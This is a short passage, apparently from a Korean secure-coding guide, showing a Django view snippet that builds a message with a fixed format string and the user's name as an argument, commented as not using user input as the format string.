    # 사용자가 입력한 문자열을 포맷 문자열로 사용하지 않는다.
    message = 'user name is {}'.format(user_info.name)

    return render(request, 'user_page.html', {'message': message})
```
---

 